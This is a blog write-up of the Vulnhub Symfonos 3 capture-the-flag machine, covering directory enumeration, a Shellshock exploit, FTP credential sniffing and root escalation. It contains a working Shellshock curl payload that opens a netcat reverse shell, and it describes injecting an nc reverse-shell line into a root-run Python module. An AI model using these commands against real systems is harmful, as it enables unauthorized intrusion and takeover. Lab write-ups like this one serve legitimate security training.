---
layout:     post
title:      "Vulnhub - Symfonos 3"
subtitle:   "Write-Up"
date:       2019-08-04 
author:     "D4mianwayne"
tag:      nmap, ctf, vulnhub
category: Vulnhub
---

This is a walkthrough of Symfonos 3 which is 3rd machine in Symfonod series.

# Nmap

Let's scan the network and start working on the machine right away. Using `nmap -sV -sC -A -p- -T5 192.168.43.22` shows that we have FTP, SSH and HTTP.

![](/img/symfonos3/nmap.png)

# HTTP Enumeration

This was kind of time consuming since it involves lots of nested directory busting, I mostly use gobutser so with some bash scripting I automated the scan by updating the script with every finding. 
My strategy for that was to copy every dictionary/wordlists into a single directory and using the bash we used it to find the directories. I used **dirbuster** and **dirb** wordlists only.

```
#!/bin/sh
for i in $(pwd)/*.txt; do
    gobuster dir -u http://192.168.43.22 -w "$i" | grep Status: 
done
```

First, I found `gate`, then `cerberus` after that `tartarus`. After that I tried again with the script this time we got more than 4 hits:-

```
=============================================================== 
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.43.22/gate/cerberus/tartarus/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/08/04 01:28:56 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/charon (Status: 301)
/hermes (Status: 301)
/research (Status: 200)
===============================================================
```
 
But somehow `research` was a rabbit hole, perhaps a wild goose chase for us. Then, I tried again with `cgi-bin` from previous findings. Now directory busting to the `http://192.168.43.22/cgi-bin`, I found a hit at `underworld`. PS: In case you don't know about greek mythology, underworld is home of the god **Hades**.

```
#!/bin/sh
for i in $(pwd)/*.txt; do
    gobuster dir -u http://192.168.43.22/cgi-bin -w "$i" | grep Status: 
done
```

***
root@kali:/usr/share/wordlists/dirb# ./new.sh
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.hta (Status: 403)
/underworld (Status: 200)
*** 

![](/img/symfonos3/underworld.png)
There, we got the `underworld`, the real game begins from here.

# Reverse Shell and FTP Network Sniffing

From that page we can see that it's saying `uptime`, I tried to enumerate more but somehow none worked. I switched to some research on similar machines to get information about this thinking that it might have been some kind of task of a machine.
From that I found a machine from PentesterLab which has **kind of** vulnerability but after checking it I was confirmed that it was same. The vulnerability is named **ShellShock**. In this type of vulnerablity you have the pass the bash command as a User-Agent for that particular request. So, using the following command with the help of curl, we get a reverse shell on our host machine.

```
robin@oracle:~$ curl -A "() { :; }; /bin/bash -c 'nc 192.168.43.243 1337 -e /bin/sh'" http://192.168.43.22/cgi-bin/underworld
```

Once, we get reverse shell I found out we have privilge of cerberus, so from some basc enumeration I didn't found anything so I thought of using the `pspy` script which is useful for tracing the background proccesses. Using `pspy`  after using wget to grab it from server I found out there is a ftp server is running in the background. I thought of checking the directory too but permission denied. 
Now, I started grabbing the network dump using tcpdump since it ws available for usage, using `tcpdump -w ftplog.pcap -i lo`, the FTP server was runiing on the `lo` interface because the other one has our reverse shell connected to using shellshock. SInce, I first grabbed the `en0ps17` but I saw that our curl is making request to server. 

![](/img/symfonos3/pspy.png)

>Warning: Let the tcpdump run for 5-10 minutes so you can grab enough data to analyse.

I saved the file in `/tmp` folder and started a HTTP server using python `python -m SimpleHTTPServer 1234` and grabbed the `ftplog.pcap` right away from `http://192.168.43.22:1234`.

After opening it in wireshark and filtering out the packets for FTP only with `tcp.port == 21`, I got some packets with FTP service and following TCP Stream of that packet I found the user `hades` password.

![](/img/symfonos3/hades.png)

# Root 

Once you SSH into the system as user **hades** with the above password you'll find out that we have the same thing as user cerberus. So, the last option was to run the `pspy` again, doing that so I found that we have nothing more nothing less than previous scan. I started trying again in ftpclient, this time we can access the folder which has a python script which is running the server by the **root** itself. So, there is **more to see than meets the eye**. 

After analysing the script I found that script is using a module named `ftplib.py` in `/opt/ftpclient` which is running as root, as from my previous experience I thought that we need to edit the module file itself to get root privilges or anything to get moving. I checked permission and it turns out we can edit it since the user `hades` ia belong to group `gods`. 

![](/img/symfonos3/ftpclient.png)

Now, I added a line `os.system("nc 192.168.43.243 4444 -e /bin/bash)` in the file so that once the script will be run our reverse shell gets executed giving a root shell. So, once done I started my listener and start analysing the process again, once that script runs we have the shell as **root**.
Hence, the flag. 

![](/img/symfomos3/root.png)

Thanks to [@zayotic](https://twitter.com/zayotic) for making this wonderful machine.
